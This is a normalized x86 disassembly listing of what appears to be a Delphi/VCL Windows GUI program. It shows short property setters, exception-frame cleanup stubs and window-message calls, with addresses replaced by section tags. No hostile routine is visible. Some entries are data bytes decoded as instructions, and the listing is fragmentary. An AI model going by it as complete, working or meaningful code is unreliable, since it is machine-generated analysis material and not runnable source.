mov eax [ ebx + 0x30 ]
call sub_416b18
pop esi
pop ebx
retn
sub_441128
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x8 ]
retn
sub_441164
cmp edx [ eax + 0x38 ]
jne r-xdata
retn
mov edx [ eax ]
call [ edx + 0x30 ]
sub_441328
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
pop ebx
retn
sub_44133c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
pop ebx
retn
sub_441350
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
pop ebx
retn
sub_441364
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
pop ebx
retn
sub_441378
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
pop ebx
retn
sub_44138c
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
pop ebx
retn
sub_4413a0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
pop ebx
retn
sub_4413b4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
pop ebx
retn
sub_4413c8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
pop ebx
retn
sub_4413dc
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032f0
pop ebx
retn
sub_4413f0
retn
sub_4413f4
retn
sub_4413f8
retn
sub_4413fc
retn
sub_441400
retn
sub_441404
retn
sub_441408
retn
sub_44140c
retn
sub_441410
retn
sub_441414
retn
sub_441418
retn
sub_44141c
retn
sub_4416c8
jmp sub_4038a0
sub_441a64
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x90 ] eax
sub_441a8c
push esi
mov si 0xffef
call sub_403360
pop esi
retn
sub_441b2d
jmp sub_4038a0
sub_441b34
pop ebp
retn
sub_441b38
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4163a0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4163a0
sub_441cd8
mov edx eax
sub edx 0xff000000
je r-xdata
mov eax 0x20000000
sub edx 0xffffff
jne r-xdata
retn
mov eax 0x1fffffff
retn
sub_441e5d
jmp sub_4038a0
sub_441e64
pop ebx
pop ecx
pop ebp
retn
sub_441e68
cmp [ eax + 0x3c ] 0x0
setne al
retn
sub_441e70
cmp [ eax + 0x3c ] 0x0
jne r-xdata
retn
call sub_442040
sub_441f1d
jmp sub_4038a0
sub_441f24
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x54 ]
test eax eax
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
call sub_403164
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x54 ] edx
sub_4420d3
jmp sub_4038a0
sub_4420da
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_442172
jmp sub_4038a0
sub_442179
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442196
mov eax [ ebp - 0xc ]
call sub_403164
retn
sub_44218f
jmp sub_4038a0
sub_442196
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403360
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44224f
jmp sub_4038a0
sub_442256
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44225c
or edx 0xffffffff
call sub_4421d0
retn
sub_44266b
jmp sub_4038a0
sub_442672
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44268f
mov eax [ ebp - 0xc ]
call sub_403164
retn
sub_442688
jmp sub_4038a0
sub_44268f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4426ac
mov eax [ ebp - 0x4 ]
call sub_4431a4
retn
sub_4426a5
jmp sub_4038a0
sub_4426ac
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4428b0
jmp sub_4038a0
sub_4428b7
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4428bc
push esi
mov esi eax
cmp dl [ esi + 0x40 ]
je r-xdata
pop esi
retn
mov [ esi + 0x40 ] dl
mov eax esi
mov si 0xffef
call sub_403360
sub_4428d4
push ebx
mov ebx edx
mov ecx ebx
xor edx edx
xor eax eax
call sub_4156bc
pop ebx
retn
sub_442978
mov [ edx + 0x4 ] eax
mov ecx [ eax + 0x4c ]
test ecx ecx
je r-xdata
retn
mov eax ecx
call sub_4169bc
sub_442a8f
jmp sub_4038a0
sub_442a96
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403164
retn
sub_442aac
jmp sub_4038a0
sub_442dbe
jmp sub_4038a0
sub_442dc5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442de2
mov eax [ ebp - 0x10 ]
call sub_403164
retn
sub_442ddb
jmp sub_4038a0
sub_442de2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442dff
mov eax [ ebp - 0x8 ]
call sub_403164
retn
sub_442df8
jmp sub_4038a0
sub_442dff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442e68
jmp sub_4038a0
sub_442f81
jmp sub_4038a0
sub_442f9e
jmp sub_4038a0
sub_443156
jmp sub_4038a0
sub_44315d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4431a0
inc [ eax + 0x5c ]
retn
sub_4431a4
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403360
sub_4431f8
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_443235
jmp sub_4038a0
sub_44323c
pop ebp
retn
sub_443240
sub [ rw-data ] 0x1
retn
sub_44363c
inc eax
int3
sub_44368c
clc
push edx
push ecx
[ ecx + esi * 2 + 0x44 ]
sub_443e38
inc eax
int3
sub_44414b
jmp [ eax + eax ]
sub_4441a8
mov eax [ esp + 0x8 ]
retn
sub_4441b0
push ebx
mov ebx eax
call sub_4441a8
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e0
jmp sub_4038d8
sub_4441cc
pop ebx
retn
sub_444445
jmp sub_4038a0
sub_44444c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444597
jmp sub_4038a0
sub_44459e
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4445b4
push ebx
mov eax [ rw-data ]
call sub_417018
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_416fec
mov eax ebx
pop ebx
retn
sub_44473c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403314
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_444758
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403314
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_444e53
jmp sub_4038a0
sub_444e5a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_444f52
jmp sub_4038a0
sub_444f59
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44537c
jmp sub_4038a0
sub_445383
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44582f
jmp sub_4038a0
sub_445cd0
jmp sub_4038a0
sub_445cd7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44613b
jmp sub_4038a0
sub_4465f8
jmp sub_4038a0
sub_4465ff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4469aa
jmp sub_4038a0
sub_4469b1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4469bf
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446b6c
mov eax [ r-xdata ]
retn
sub_446ba8
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446bbc
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446bcc
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446bdc
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_446ed8
mov edx eax
sub_446c74
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_403314
mov edx esi
call sub_446bf4
pop esi
pop ebx
retn
sub_446cf0
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_446ed8
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_416b74
mov ecx eax
sub_4470c8
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_447130
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_4474d8
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_44750c
sub_44750c
mov edx sub_4474e4
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_444634
retn
sub_4476f6
jmp sub_4038a0
sub_4476fd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447b94
jmp sub_4038a0
sub_447bd3
jmp sub_4038a0
sub_447bda
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_447d78
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_447eb4
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403360
pop esi
pop ebp
retn 0x8
sub_447ed0
mov eax [ eax + 0x34 ]
call sub_445108
retn
sub_447edc
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403360
pop esi
retn
sub_447f18
push ebx
mov ecx sub_447ef0
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_444634
pop ebx
retn
sub_44814c
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_448160
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_448295
jmp sub_4035ec
sub_448397
jmp sub_4038a0
sub_4483c2
jmp sub_4038a0
sub_4483c9
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_4483e0
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_4485c8
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_447f18
sub_448648
jmp sub_4038a0
sub_44868c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_4486a4
push ebx
mov ebx eax
mov eax ebx
call sub_41c908
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_4486f6
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_447f18
sub_44876c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4488b5
jmp sub_4038a0
sub_4488bc
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_448afc
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_448b0c
sub_448b60
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_448b70
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_448b80
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_448b90
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_448ba0
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_448c18
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_444f60
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_444f60
retn
sub_448c34
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_444f60
sub_448c7c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_447ed0
retn
mov eax edx
retn
sub_448cb6
jmp sub_4035ec
sub_448cbb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_454884
call sub_403954
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_449021
jmp sub_4038a0
sub_449028
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_403164
retn
sub_44903e
jmp sub_4038a0
sub_44913f
jmp sub_4038a0
sub_449146
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449163
mov eax [ ebp - 0x14 ]
call sub_403164
retn
sub_44915c
jmp sub_4038a0
sub_449181
jmp sub_4038a0
sub_44920b
jmp sub_4038a0
sub_449212
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_449244
push ebx
mov ebx eax
mov eax ebx
call sub_416c5c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41d6b8
sub_449308
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_44931c
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_449324
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_4496e9
jmp sub_4038a0
sub_4496f0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4497f0
jmp sub_4038a0
sub_4497f7
pop ebp
retn
sub_44a36f
[ edi + edi * 8 - 0x2f002f ]
sub_44a376
stc
jmp esp
sub_44a4ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_44a5f2
inc esp
add [ edi ] al
add eax 0x726f4654
insd
hlt
sub_44b638
mov eax [ rw-data ]
retn
sub_44b640
mov [ rw-data ] eax
retn
j_sub_4035ec#9
jmp sub_4035ec
sub_44b7bf
jmp sub_4038a0
sub_44b7c6
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44bace
jmp sub_4038a0
sub_44bad5
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44bb79
jmp sub_4038a0
sub_44bb80
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44bc10
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_44c33c
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44c9e8
sub_44c358
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_44c33c
sub_44c478
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44c9e8
sub_44c490
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_44c9e8
sub_44c4a8
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_44c9e8
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_44c4d4
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_44c4e0
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_44c9e8
retn
sub_44c7c0
push ebx
mov ebx edx
mov edx ebx
call sub_438774
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_44c830
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_44c958
jmp sub_4038a0
sub_44c95f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c968
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_44bd74
mov eax [ ebx + 0x20c ]
call sub_44bd74
sub_44c9c8
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44c9d8
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_44cad3
jmp sub_4038a0
sub_44cae0
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_44caf8
sub_44cd14
retn
sub_44cd82
jmp sub_4038a0
sub_44cdc1
jmp sub_4038a0
sub_44cdf4
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_439c6c
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_44c000
retn
sub_44ce18
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_439c8c
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_44c000
retn
sub_44cf0d
jmp sub_4038a0
sub_44cf14
mov eax [ ebp - 0x4 ]
call sub_43bbec
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_44bc68
mov eax [ ebp - 0x4 ]
call sub_44c9e8
sub_44d048
jmp sub_4038a0
sub_44d080
jmp sub_4038a0
sub_44d087
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d0a7
lea eax [ ebp - 0x114 ]
call sub_403e9c
retn
sub_44d0a0
jmp sub_4038a0
sub_44d0a7
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_44d3ae
jmp sub_4038a0
sub_44d3b5
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034c0
j_sub_4035ec#8
jmp sub_4035ec
j_sub_4035ec#7
jmp sub_4035ec
sub_44d48a
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_454884
call sub_403954
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d842
jmp sub_4038a0
sub_44d849
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44d924
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41a898
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_44d93c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d974
mov edx eax
mov eax esi
call sub_41c120
pop esi
pop ebx
retn
sub_44d958
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44ed18
mov edx eax
mov eax esi
call sub_41c120
pop esi
pop ebx
retn
sub_44d974
push ebx
mov ebx eax
mov eax ebx
call sub_44e9b8
mov edx r-xdata
call sub_42023c
pop ebx
retn
sub_44da78
push ebx
mov ebx eax
mov eax ebx
call sub_44da88
xor al 0x1
pop ebx
retn
sub_44da88
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_44dae4
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_44db04
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_44db24
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_44de1d
jmp sub_4038a0
sub_44de24
pop ecx
pop ebp
retn
sub_44de28
xor eax eax
retn
sub_44e100
jmp sub_4038a0
sub_44e107
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403164
retn
sub_44e11d
jmp sub_4038a0
sub_44e207
jmp sub_4038a0
sub_44e20e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e22b
mov eax [ ebp - 0xc ]
call sub_403164
retn
sub_44e224
jmp sub_4038a0
sub_44e24b
jmp sub_4038a0
sub_44e536
jmp sub_4038a0
sub_44e6c9
jmp sub_4038a0
sub_44e9b8
mov eax [ eax + 0x238 ]
retn
sub_44e9c0
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_44e9cc
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_44ed0a
jmp sub_4038a0
sub_44ed11
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44ed18
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_44ed60
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_438e88
sub_44ed7c
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_44edb8
push ebx
mov ebx eax
mov eax ebx
call sub_43ae1c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41fcc0
sub_44ee3c
push ebx
mov ebx eax
mov eax ebx
call sub_43ae44
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_4202e0
sub_44ee5c
push ebx
mov ebx eax
mov eax ebx
call sub_44ea7c
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_44eb44
pop ebx
retn
sub_44f689
lea eax [ ebp - 0xb4 ]
call sub_403e9c
retn
sub_44f695
jmp sub_4038a0
j_sub_44f689
jmp sub_44f689
sub_44f69c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44f7f4
jmp sub_4038a0
sub_44f7fb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fae0
jmp sub_4038a0
sub_44fae7
mov eax [ rw-data ]
call sub_452398
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44fafe
add [ eax ] al
retn
sub_44fd5c
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_44fd7c
mov eax [ eax + 0x240 ]
call sub_424484
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_454138
sub_44fe23
jmp sub_4038a0
sub_44fe2a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe4d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_4202b8
retn
sub_44fe46
jmp sub_4038a0
sub_44fe4d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45000c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44fd7c
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_450274
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_448084
sub_45035f
jmp sub_4038a0
sub_450366
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45036c
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_44fb54
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_4503c4
call sub_4510ec
retn
sub_450811
jmp sub_4038a0
sub_450818
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4035ec#6
jmp sub_4035ec
j_sub_4035ec#5
jmp sub_4035ec
sub_450fa9
jmp sub_4038a0
sub_450fb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450fcd
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
sub_450fc6
jmp sub_4038a0
sub_450fcd
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450fd4
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_424484
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_44da1c
sub_450ff4
call sub_403164
retn
sub_45104c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_4510b2
jmp sub_4038a0
j_sub_4035ec#4
jmp sub_4035ec
sub_45128c
xor edx edx
call sub_44dd80
retn
sub_451294
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_44dd80
mov eax ebx
call sub_43536c
pop ebx
retn
sub_45131a
jmp sub_4038a0
sub_451321
pop ebx
pop ecx
pop ebp
retn
sub_451328
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_43b8e8
push eax
call PostMessageA
pop ebx
retn
sub_45152c
jmp sub_4038a0
sub_4515cd
jmp sub_4038a0
sub_4515d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4515f6
mov eax [ rw-data ]
call sub_453810
retn
sub_4515ef
jmp sub_4038a0
sub_4515f6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451613
lea eax [ ebp - 0x20 ]
call sub_403e9c
retn
sub_45160c
jmp sub_4038a0
sub_451613
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4516f4
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_434518
retn
mov edx eax
mov eax [ rw-data ]
call sub_452e64
retn
sub_451a78
mov edx eax
mov eax [ rw-data ]
call sub_454884
mov al 0x1
retn
sub_451b60
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_451a88
sub_451b74
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
